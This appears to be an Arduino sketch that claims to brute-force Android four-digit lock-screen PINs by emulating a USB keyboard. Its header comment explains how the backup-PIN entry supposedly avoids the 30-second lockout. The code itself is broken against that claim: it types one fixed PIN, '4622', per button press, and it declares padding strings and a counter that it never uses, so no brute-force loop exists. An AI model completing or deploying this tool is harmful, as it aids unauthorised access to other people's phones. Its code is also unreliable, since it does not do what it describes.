/* 
Brute forcing Android 4 Digit PIN's
To run the whole range it will take upwards of 16 hours because of
the 30 second delay after 5 bad inputs 
Intrestingly, if the target phone has the pattern enabled 
and the backup PIN set, the backup PIN entry system doesn't force the 30 second delay after
invalid attempts
http://blog.infosecsee.com */

const int buttonPin = 2;          // input pin for pushbutton
int previousButtonState = HIGH;   // for checking the state of a pushButton
int counter = 0;                  // button push counter
int check = 0;

void setup() 
{

  pinMode(buttonPin, INPUT);

  Keyboard.begin();
}

void loop() {

  int buttonState = digitalRead(buttonPin);
  
  if ((buttonState != previousButtonState) && (buttonState == HIGH))
  {
    Mouse.move(25, 50, 0);
    String three = "000";
    String two = "00";
    String one = "0";

  
    Keyboard.println("4622");
    delay(500);


  
          
    }
    
    previousButtonState = buttonState; 
}
